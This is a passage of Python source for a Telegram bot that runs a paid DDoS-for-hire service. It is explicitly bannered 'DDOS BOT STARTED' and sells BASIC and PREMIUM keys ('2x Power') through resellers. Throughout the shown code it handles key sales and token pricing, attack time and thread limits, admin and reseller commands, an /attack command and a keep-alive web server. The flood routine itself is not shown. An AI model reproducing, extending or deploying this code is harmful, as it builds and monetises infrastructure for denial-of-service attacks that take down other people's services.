━━━━━━━━━━━━━━━━━━━━━━━━
💰 Balance: {get_reseller_tokens(user_id)}
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ BASIC Plan:
├ ⏱️ 300s Max Time
├ ⏳ 60s Cooldown
└ 📊 50 Daily Limit
━━━━━━━━━━━━━━━━━━━━━━━━
Select duration below:
━━━━━━━━━━━━━━━━━━━━━━━━""", buttons)

def handle_genkey_premium_callback(callback_query):
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    del_msg(chat_id, msg_id)
    
    buttons = [
        [{"text": "🕐 VIP 1 DAY - 6 TOKENS", "callback_data": "genkey_premium_1d"}],
        [{"text": "📅 VIP 3 DAYS - 12 TOKENS", "callback_data": "genkey_premium_3d"}],
        [{"text": "📅 VIP 7 DAYS - 20 TOKENS", "callback_data": "genkey_premium_7d"}],
        [{"text": "📅 VIP 14 DAYS - 35 TOKENS", "callback_data": "genkey_premium_14d"}],
        [{"text": "📅 VIP 30 DAYS - 60 TOKENS", "callback_data": "genkey_premium_30d"}],
        [{"text": "📅 VIP 60 DAYS - 100 TOKENS", "callback_data": "genkey_premium_60d"}],
        [{"text": "🔙 BACK", "callback_data": "genkey_back"}]
    ]
    send_buttons(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 **PREMIUM KEYS (2x Power)**
━━━━━━━━━━━━━━━━━━━━━━━━
💰 Balance: {get_reseller_tokens(user_id)}
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ PREMIUM Plan:
├ ⏱️ 600s Max Time
├ ⏳ 0s Cooldown
└ 📊 100 Daily Limit
━━━━━━━━━━━━━━━━━━━━━━━━
Select duration below:
━━━━━━━━━━━━━━━━━━━━━━━━""", buttons)

def handle_genkey_confirm_callback(callback_query):
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    del_msg(chat_id, msg_id)
    
    # Parse data: genkey_basic_1d or genkey_premium_1d
    parts = cb_data.split("_")
    key_type = parts[1]  # basic or premium
    duration = parts[2]  # 1h, 5h, 1d, etc.
    
    # Map duration for display
    dur_map = {
        "1h": "1 HOUR",
        "5h": "5 HOURS",
        "1d": "1 DAY",
        "3d": "3 DAYS",
        "7d": "7 DAYS",
        "14d": "14 DAYS",
        "30d": "30 DAYS",
        "60d": "60 DAYS"
    }
    
    dur_display = dur_map.get(duration, duration)
    key_info = RESELLER_KEY_PRICES.get(duration if key_type == "basic" else f"VIP_{duration}")
    
    if not key_info:
        send_msg(chat_id, "❌ Invalid duration!")
        return
    
    price = key_info['price']
    
    buttons = [
        [{"text": "✅ YES, GENERATE", "callback_data": f"confirm_{key_type}_{duration}"}],
        [{"text": "❌ CANCEL", "callback_data": "genkey_cancel"}]
    ]
    
    plan_name = "📀 BASIC" if key_type == "basic" else "🌟 PREMIUM"
    send_buttons(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **CONFIRM KEY GENERATION**
━━━━━━━━━━━━━━━━━━━━━━━━
📅 Type: {dur_display}
🌟 Plan: {plan_name}
💰 Price: {price} tokens
📊 Balance: {get_reseller_tokens(user_id)}
━━━━━━━━━━━━━━━━━━━━━━━━
Do you want to generate this key?
━━━━━━━━━━━━━━━━━━━━━━━━""", buttons)

def handle_genkey_final_callback(callback_query):
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    del_msg(chat_id, msg_id)
    
    if cb_data == "genkey_cancel":
        send_msg(chat_id, "❌ Cancelled!")
        return
    
    # Parse: confirm_basic_1d or confirm_premium_1d
    parts = cb_data.split("_")
    key_type = parts[1]  # basic or premium
    duration = parts[2]  # 1h, 5h, 1d, etc.
    
    key, msg = generate_reseller_key(user_id, key_type, duration)
    if key:
        send_msg(chat_id, msg)
    else:
        send_msg(chat_id, key)

def handle_genkey_back_callback(callback_query):
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    del_msg(chat_id, msg_id)
    handle_genkey_reseller(chat_id, user_id)

def handle_deletekey_reseller(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_reseller(user_id):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    keys_list = get_reseller_keys(user_id)
    if not keys_list:
        send_msg(chat_id, "❌ No keys to delete!")
        return
    buttons = [[{"text": f"🔑 {k}", "callback_data": f"delkey_{k}"}] for k in keys_list[:20]]
    buttons.append([{"text": "❌ CANCEL", "callback_data": "delkey_cancel"}])
    send_buttons(chat_id, "🗑️ SELECT KEY TO DELETE", buttons)

def handle_myblockedkeys(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_reseller(user_id):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    blocked = my_blocked_keys(user_id)
    if not blocked:
        send_msg(chat_id, "❌ No blocked keys!")
        return
    msg = "🚫 YOUR BLOCKED KEYS\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for k in blocked:
        msg += f"🔑 {k}\n"
    send_msg(chat_id, msg)

# MyPlan
def handle_myplan(chat_id, user_id):
    if is_bot_off:
        return
    
    if str(user_id) not in users and not is_admin(user_id) and not is_reseller(user_id):
        send_msg(chat_id, "❌ NO ACTIVE PLAN FOUND!\nUse /redeem KEY to get access.")
        return
    
    if str(user_id) in users and time.time() >= users[str(user_id)] and not is_admin(user_id) and not is_reseller(user_id):
        send_msg(chat_id, "❌ PLAN EXPIRED!\nUse /redeem KEY to get a new plan.")
        return
    
    if is_admin(user_id):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
👑 **ADMIN PLAN**
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: PREMIUM 💎 (UNLIMITED)
⏳ Remaining: LIFETIME
📅 Expiry: NEVER
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    if is_reseller(user_id):
        tokens = get_reseller_tokens(user_id)
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
💼 **RESELLER PLAN**
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: PREMIUM 💎
⏳ Remaining: LIFETIME
🎫 Tokens: {tokens}
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    remaining_time = get_user_remaining_time(user_id)
    expiry_date = get_user_expiry_date(user_id)
    plan_name = get_plan_name(user_id)
    limits = get_user_limits(user_id)
    
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📋 **YOUR PLAN**
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: {plan_name}
⏳ Remaining: {remaining_time}
📅 Expiry: {expiry_date}
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ **Limits:**
├ 🎯 Max Concurrent: {limits['max_concurrent']}
├ ⏱️ Max Time: {limits['max_time']}s
├ ⏳ Cooldown: {limits['cooldown']}s
├ 📊 Daily Limit: {limits['daily_limit']}
└ 🧵 Threads: {limits['threads']}
━━━━━━━━━━━━━━━━━━━━━━━━""")

# JSON Backup
def handle_getjson(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    send_msg(chat_id, "⏳ Generating JSON backups...")
    
    users_json = get_users_json_clean()
    send_document(chat_id, users_json, "users.json")
    time.sleep(1)
    
    resellers_json = get_resellers_json_clean()
    send_document(chat_id, resellers_json, "resellers.json")
    time.sleep(1)
    
    keys_json = get_keys_json_clean()
    send_document(chat_id, keys_json, "keys.json")
    
    send_msg(chat_id, "✅ JSON BACKUP COMPLETE!")

# ============================================
# CALLBACK HANDLERS
# ============================================

def handle_genkey_callback(callback_query):
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    
    if cb_data == "genkey_basic_menu":
        handle_genkey_basic_callback(callback_query)
    elif cb_data == "genkey_premium_menu":
        handle_genkey_premium_callback(callback_query)
    elif cb_data == "genkey_back":
        handle_genkey_back_callback(callback_query)
    elif cb_data == "genkey_cancel":
        del_msg(chat_id, callback_query["message"]["message_id"])
        send_msg(chat_id, "❌ Cancelled!")
    elif cb_data.startswith("genkey_basic_"):
        handle_genkey_confirm_callback(callback_query)
    elif cb_data.startswith("genkey_premium_"):
        handle_genkey_confirm_callback(callback_query)
    elif cb_data.startswith("confirm_"):
        handle_genkey_final_callback(callback_query)

def handle_delkey_callback(callback_query):
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    del_msg(chat_id, msg_id)
    
    if cb_data == "delkey_cancel":
        send_msg(chat_id, "❌ Cancelled!")
        return
    
    key = cb_data.replace("delkey_", "")
    success, msg = delete_key(key, user_id)
    send_msg(chat_id, msg)

def handle_admin_del_callback(callback_query):
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_admin(user_id):
        answer_callback(cb_id, "❌ Admin only!")
        return
    
    answer_callback(cb_id)
    del_msg(chat_id, msg_id)
    
    count = 0
    if cb_data == "admin_del_unused":
        for k, v in list(keys.items()):
            if not v['used'] and not v.get('blocked'):
                del keys[k]
                count += 1
        save_data()
        send_msg(chat_id, f"✅ Deleted {count} unused keys!")
    elif cb_data == "admin_del_used":
        for k, v in list(keys.items()):
            if v['used']:
                expire_user_by_key(k)
                del keys[k]
                count += 1
        save_data()
        send_msg(chat_id, f"✅ Deleted {count} used keys! Users expired.")
    elif cb_data == "admin_del_all":
        for k, v in list(keys.items()):
            if v.get('used'):
                expire_user_by_key(k)
        keys.clear()
        for rid in resellers:
            resellers[rid]['keys_generated'] = []
        save_data()
        send_msg(chat_id, "✅ Deleted all keys! Users expired.")
    else:
        send_msg(chat_id, "❌ Cancelled!")

# ============================================
# MAIN BOT LOOP
# ============================================

def main():
    global last_update_id
    load_data()
    
    for admin_id in ADMIN_IDS:
        if str(admin_id) not in users:
            add_user(admin_id, 3650, 0)
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook", timeout=5)
    except:
        pass
    
    print("""
    ╔══════════════════════════════════════════╗
    ║      ⚡ DDOS BOT STARTED ⚡              ║
    ║   BASIC + PREMIUM Key System!           ║
    ║   Premium = 2x Power!                   ║
    ║   Reseller System Active!               ║
    ╚══════════════════════════════════════════╝
    """)
    
    print(f"👑 Active Admins: {ADMIN_IDS}")
    print(f"📊 Max Concurrent: {MAX_CONCURRENT}")
    print(f"⏱️ Max Time: {MAX_TIME}s")
    print(f"🎛️ Bot Status: {'ONLINE' if not is_bot_off else 'OFFLINE'}")
    print(f"✅ Bot is running...")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_update_id+1}&timeout=30"
            r = requests.get(url, timeout=35)
            data = r.json()
            
            if not data.get('ok'):
                time.sleep(1)
                continue

            for update in data.get("result", []):
                last_update_id = update["update_id"]
                save_data()

                if "callback_query" in update:
                    if is_bot_off:
                        continue
                    callback = update["callback_query"]
                    cb_data = callback["data"]
                    
                    if cb_data.startswith("genkey_"):
                        handle_genkey_callback(callback)
                    elif cb_data.startswith("confirm_"):
                        handle_genkey_final_callback(callback)
                    elif cb_data.startswith("delkey_"):
                        handle_delkey_callback(callback)
                    elif cb_data.startswith("admin_del_"):
                        handle_admin_del_callback(callback)
                    continue

                msg = update.get("message")
                if not msg:
                    continue

                chat_id = msg["chat"]["id"]
                user_id = msg["from"]["id"]
                username = msg["from"].get("username", "User")
                text = msg.get("text", "")

                if msg.get("video"):
                    if is_bot_off:
                        continue
                    handle_video(chat_id, user_id, msg["video"]["file_id"])
                    continue
                
                if msg.get("document"):
                    if is_bot_off:
                        continue
                    doc = msg.get("document")
                    file_name = doc.get("file_name", "")
                    
                    try:
                        file_id = doc["file_id"]
                        file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                        file_path = file_info["result"]["file_path"]
                        file_content = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}").text
                        
                        if file_name == "users.json":
                            restore_users_from_json(file_content)
                        elif file_name == "resellers.json":
                            restore_resellers_from_json(file_content)
                        elif file_name == "keys.json":
                            restore_keys_from_json(file_content)
                        else:
                            send_msg(chat_id, "❌ Send: users.json, resellers.json, or keys.json")
                    except Exception as e:
                        send_msg(chat_id, f"❌ Upload error: {str(e)}")
                    continue
                
                if not text:
                    continue
                
                parts = text.split()
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                if is_bot_off:
                    continue
                
                cmd_key = f"{user_id}_{cmd}"
                current_time = time.time()
                if cmd_key in cmd_cooldown:
                    if current_time - cmd_cooldown[cmd_key] < 0.5:
                        continue
                cmd_cooldown[cmd_key] = current_time
                
                try:
                    if cmd == "/start":
                        handle_start(chat_id, user_id)
                    elif cmd == "/attack":
                        handle_attack(chat_id, user_id, username, args)
                    elif cmd == "/status":
                        handle_status(chat_id, user_id)
                    elif cmd == "/stop":
                        handle_stop(chat_id, user_id)
                    elif cmd == "/redeem":
                        handle_redeem(chat_id, user_id, args)
                    elif cmd == "/id":
                        handle_id(chat_id, user_id)
                    elif cmd == "/myplan":
                        handle_myplan(chat_id, user_id)
                    elif cmd == "/rules":
                        handle_rules(chat_id, user_id)
                    elif cmd == "/help":
                        handle_help(chat_id, user_id)
                    elif cmd == "/settings":
                        handle_settings(chat_id, user_id)
                    elif cmd == "/setmaxconcurrent":
                        handle_setmaxconcurrent(chat_id, user_id, args)
                    elif cmd == "/settime":
                        handle_settime(chat_id, user_id, args)
                    elif cmd == "/setcooldown":
                        handle_setcooldown(chat_id, user_id, args)
                    elif cmd == "/setdaily":
                        handle_setdaily(chat_id, user_id, args)
                    elif cmd == "/lock":
                        handle_lock(chat_id, user_id)
                    elif cmd == "/unlock":
                        handle_unlock(chat_id, user_id)
                    elif cmd == "/maintenance":
                        handle_maintenance(chat_id, user_id, args)
                    elif cmd == "/delvideo":
                        remove_video(chat_id, user_id)
                    elif cmd == "/genbasic":
                        handle_genbasic_admin(chat_id, user_id, args)
                    elif cmd == "/genpremium":
                        handle_genpremium_admin(chat_id, user_id, args)
                    elif cmd == "/keys":
                        handle_keys(chat_id, user_id)
                    elif cmd == "/deletekeys":
                        handle_deletekeys(chat_id, user_id)
                    elif cmd == "/blockkey":
                        handle_blockkey_admin(chat_id, user_id, args)
                    elif cmd == "/unblockkey":
                        handle_unblockkey_admin(chat_id, user_id, args)
                    elif cmd == "/adduser":
                        handle_adduser(chat_id, user_id, args)
                    elif cmd == "/removeuser":
                        handle_removeuser(chat_id, user_id, args)
                    elif cmd == "/addgroup":
                        handle_addgroup(chat_id, user_id, args)
                    elif cmd == "/removegroup":
                        handle_removegroup(chat_id, user_id, args)
                    elif cmd == "/groups":
                        handle_groups(chat_id, user_id)
                    elif cmd == "/broadcast":
                        handle_broadcast(chat_id, user_id, args)
                    elif cmd == "/alluser":
                        handle_alluser(chat_id, user_id)
                    elif cmd == "/addreseller":
                        handle_addreseller(chat_id, user_id, args)
                    elif cmd == "/removereseller":
                        handle_removereseller(chat_id, user_id, args)
                    elif cmd == "/resellers":
                        handle_resellers(chat_id, user_id)
                    elif cmd == "/unlimited":
                        handle_unlimited(chat_id, user_id, args)
                    elif cmd == "/limited":
                        handle_limited(chat_id, user_id, args)
                    elif cmd == "/genkey":
                        handle_genkey_reseller(chat_id, user_id)
                    elif cmd == "/deletekey":
                        handle_deletekey_reseller(chat_id, user_id)
                    elif cmd == "/myblockedkeys":
                        handle_myblockedkeys(chat_id, user_id)
                    elif cmd == "/getjson":
                        handle_getjson(chat_id, user_id)
                    
                except Exception as e:
                    print(f"Command error: {e}")
                    send_msg(chat_id, "⚠️ An error occurred. Please try again.")
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Loop error: {e}")
            time.sleep(3)

# ============================================
# RENDER PORT FIX
# ============================================
from flask import Flask
import threading
import os
import time

web_app = Flask(__name__)

@web_app.route('/')
def home():
    return "✅ Bot is running!", 200

def run_webserver():
    port = int(os.environ.get('PORT', 8080))
    web_app.run(host='0.0.0.0', port=port)

threading.Thread(target=run_webserver, daemon=True).start()
time.sleep(2)

print("✅ Web server started on port 8080")
print("✅ Bot is now running...")

if __name__ == "__main__":
    main()